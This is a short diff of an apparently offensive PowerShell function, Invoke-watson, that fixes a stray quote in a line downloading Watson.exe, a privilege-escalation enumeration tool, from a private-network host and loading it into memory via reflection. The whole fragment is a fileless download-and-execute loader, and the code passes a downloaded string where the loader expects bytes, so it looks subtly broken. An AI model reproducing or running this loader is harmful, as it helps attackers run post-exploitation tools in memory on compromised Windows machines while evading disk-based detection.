@@ -1,6 +1,6 @@
 function Invoke-watson
 {
-    $base64binary= (New-Object System.Net.WebClient).DownloadString('http://192.168.0.102/Watson.exe')"
+    $base64binary= (New-Object System.Net.WebClient).DownloadString('http://192.168.0.102/Watson.exe')
     
     $RAS = [System.Reflection.Assembly]::Load($base64binary)
 
